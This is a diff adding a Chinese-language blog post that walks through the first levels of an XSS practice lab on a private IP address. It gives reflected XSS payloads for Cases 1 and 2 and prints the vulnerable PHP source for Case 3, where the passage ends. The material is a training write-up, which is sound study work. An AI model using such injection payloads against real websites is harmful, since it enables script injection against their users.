@@ -1,0 +1,50 @@
+Title: 靶场-xss-挑战-1-10
+Date: 2020-05-18 19:44
+Category: Security
+Tags: security, web, xss
+Slug: bachang-xss-2
+Authors: Xuan Mingyi
+
+
+#### Case 1
+
+第一题内容很简单，是一个典型的反射XSS，名字是name的GET参数直接显示在页面上，没有任何过滤。
+
+所以我们直接构建这么一个URL
+
+```shell
+http://192.168.65.149:8888/xss-tz/level1.php?name=<script>alert(1)</script>
+#http://192.168.65.149:8888/xss-tz/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E
+```
+注意下URL编码
+
+![case1](extra/images/xss/case1.jpg)
+
+
+#### Case 2
+
+第二题也很简单，不过需要注意封闭前面的input标签
+
+```shell
+payload: "><script>alert(1)</script>
+```
+
+![case2](extra/images/xss/case2.jpg)
+
+
+#### Case 3
+
+第三题，我们看一下后台文件
+
+```php
+<?php 
+ini_set("display_errors", 0);
+$str = $_GET["keyword"];
+echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
+<form action=level3.php method=GET>
+<input name=keyword  value='".htmlspecialchars($str)."'>
+<input type=submit name=submit value=搜索 />
+</form>
+</center>";
+?>
+```
